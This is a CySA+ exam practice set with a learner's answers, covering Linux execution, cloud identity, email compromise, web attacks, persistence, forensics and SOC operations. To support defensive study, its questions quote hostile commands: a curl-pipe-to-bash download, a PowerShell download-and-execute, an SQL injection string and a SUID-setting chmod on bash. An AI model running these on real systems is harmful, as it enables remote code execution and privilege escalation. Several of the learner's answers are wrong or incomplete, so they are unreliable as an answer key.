title: Advanced CySA+ Practice Set
summary: 20 advanced CySA+ practice questions and 5 SOC scenarios focused on Linux execution, cloud identity, business email compromise, web application compromise, persistence, forensic handling, and SOC operations.

questions.question:
A security analyst observes the following command executed on a Linux host:

```bash
curl -fsSL http://198.51.100.7/install.sh | bash
```

Which of the following MOST likely describes the risk?
options: Remote script execution from untrusted source
questions.myAnswer: B, suspicious IP, "install.sh" file name, bash execution

questions.question:
A SIEM correlates the following events:

* Multiple 4625 failed logons
* Successful VPN authentication
* Creation of new mailbox forwarding rule

Which of the following MOST likely occurred?
options: Password spraying followed by business email compromise
questions.myAnswer: A, because of multiple failed logins, vpn auth, and creation of new mailbox forwarding rule

questions.question:
An organization stores highly confidential research data. According to company policy, confidentiality takes priority over availability.

Which vulnerability should be remediated FIRST?
options: Internal file server vulnerable to information disclosure
Internal printer vulnerable to remote reboot
Public-facing system vulnerable to temporary slowdown
questions.myAnswer: B, because confidentiality is most important, so information disclosure should be minimized

questions.question:
An analyst discovers users are intermittently redirected from HTTPS to HTTP while accessing an internal portal.

Which of the following MOST likely explains this behavior?
questions.myAnswer: A, because it's HTTP downgrade attack, mitm

questions.question: Which of the following BEST ensures critical business functions continue operating during a cyberattack?
questions.myAnswer: B, because continuity plan is about business surviving and living during some incident

questions.question:
A company wants visibility and policy enforcement for unsanctioned cloud applications used by employees.

Which solution BEST addresses this requirement?
questions.myAnswer: A, because CASB is cloud access security broker, which controls access to cloud from other people

questions.question:
A PowerShell script contains the following:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.10/payload.ps1')
```

What is the MOST likely purpose of this command?
questions.myAnswer: B

questions.question:
An analyst receives the following EDR alert:

```text
Parent Process: winword.exe
Child Process: rundll32.exe
```

Why is this activity suspicious?
options: Word documents normally launch rundll32.exe during updates
Office applications spawning LOLBins may indicate malware execution
rundll32.exe is not a Windows binary
questions.myAnswer: B, because its not a common event, and its common in living of land attacks

questions.question:
A threat hunter wants to identify malicious persistence mechanisms on Windows endpoints.

Which artifact should be reviewed FIRST?
options: Registry Run keys and scheduled tasks
questions.myAnswer: B, because persistence is identified often in registry run keys and scheduled tasks

questions.question:
An organization wants to reduce attacker dwell time.

Which capability BEST supports this objective?
questions.myAnswer: A, because in this case attacker will have less time to act

questions.question:
A SOC analyst identifies repeated DNS TXT record requests containing Base64-like strings.

Which technique is MOST likely being used?
questions.myAnswer: B (but not confident on this one)

questions.question:
An attacker compromises a valid OAuth application and gains persistent access to user mailboxes even after password resets.

Which control would BEST mitigate this risk?
options: Review and restrict OAuth app consent permissions
questions.myAnswer: B, because restricting OAuth permissions would limit attackers access to mailboxes

questions.question:
A security analyst wants to ensure evidence remains legally admissible during an investigation.

Which process is MOST important?
questions.myAnswer: A, because chain of custody is a process to ensure some forensic evidence isn't changed

questions.question:
A forensic analyst needs to investigate malware that disappears after reboot.

Which evidence source is MOST valuable?
questions.myAnswer: A

questions.question: Which of the following BEST describes a false negative?
options: Benign activity incorrectly flagged as malicious
Malicious activity incorrectly classified as benign
questions.myAnswer: B

questions.question:
A company wants to proactively search for attacker activity that has bypassed automated detections.

Which activity BEST fits this goal?
questions.myAnswer: C, because rotating password lets analysts detect if there was password leakage and unauthorized access

questions.question:
A web application firewall blocks repeated requests containing:

```
' OR 1=1 --
```

Which attack was MOST likely attempted?
questions.myAnswer: B

questions.question:
An analyst identifies outbound traffic to a domain registered two hours ago.

Why is this particularly suspicious?
options: Newly registered domains are commonly used in phishing/C2 infrastructure
DNS only works with older domains
HTTPS traffic cannot use new domains
SIEMs automatically block all new domains
questions.myAnswer: A

questions.question:
A Linux administrator discovers:

```bash
chmod +s /bin/bash
```

Why is this concerning?
options: It enables SUID privilege escalation opportunities
questions.myAnswer: A, because chmod means change mod and then bash execution

questions.question: Which of the following would MOST likely indicate successful lateral movement?
options: Remote service creation and SMB admin share access
questions.myAnswer: B

scenarios.title: MFA Fatigue & Cloud Compromise
tasks: What attack chain MOST likely occurred?
Why did password reset not fully contain the threat?
What should analysts revoke FIRST?
What indicators suggest persistence?
What controls could reduce similar attacks?

myAnswers.answer: MFA fatigue then data exfil
Because attacker already had access to account
Freeze/delete mailbox forwarding rule, then immediately lock account or revoke all privileges
Attack continuing even after password reset
Set limit for max MFA requests, train employees on MFA fatigue attack

scenarios.title: Linux Privilege Escalation
tasks: What attack activity is MOST likely occurring?
What persistence mechanisms exist?
What evidence suggests possible exfiltration?
What should be contained FIRST?
Which MITRE ATT&CK techniques are likely involved?

myAnswers.answer: Password spraying -> priv esc -> persistence through cron job
Cron job, SSH connections
SSH connections, archive created in tmp
Isolate affected machine from internet to prevent more data exfil

scenarios.title: Web Application Breach

sections.title: Additional Findings
items: Outbound HTTPS traffic to VPS provider

tasks: What attack chain MOST likely occurred?
What evidence indicates persistence?
What evidence indicates possible data exfiltration?
What should incident responders isolate FIRST?
Which MITRE ATT&CK techniques are likely involved?

myAnswers.answer: SQL injection -> webshell malicious file execution
HTTPS traffic
Large traffic spike
Affected machines access to internet
(skipping for now)

scenarios.title: Insider Threat vs Compromised Account

sections.title: Additional Findings
items: Access originated from normal VPN location

tasks: What are the TWO most likely explanations?
What evidence would distinguish insider threat from account compromise?
What should analysts verify FIRST?
What containment actions are appropriate?
How should incident severity be classified?

myAnswers.answer: Its either insider threat or compromised account
VPN location, recent resignation submit
Persons identity and possible insider threat risk looking at previous incidents
Isolating/freezing cloud storage, revoking account privileges
Possibly high

scenarios.title: SOC Overload & Missed Intrusion

sections.title: SOC Metrics
items: Analysts manually close most phishing alerts
Several true positives missed during last month

sections.title: Recent Incident
items: Malware beaconed for 9 days before detection
SIEM generated alerts but analysts ignored them as duplicates

tasks: What operational failure MOST likely occurred?
What SIEM/SOAR improvements would MOST reduce risk?
What metrics should leadership monitor?
What risks does alert fatigue create?
What process changes would MOST improve detection quality?

myAnswers.answer: SIEM misalignment, too much manual work, alert rules not fine tuned
fine tuning SIEM
Missed true positives, recent incidents and their severity, analysts mental health
Burnout and missed positives
Specifying and tuning SIEM alert rules, and automating review more
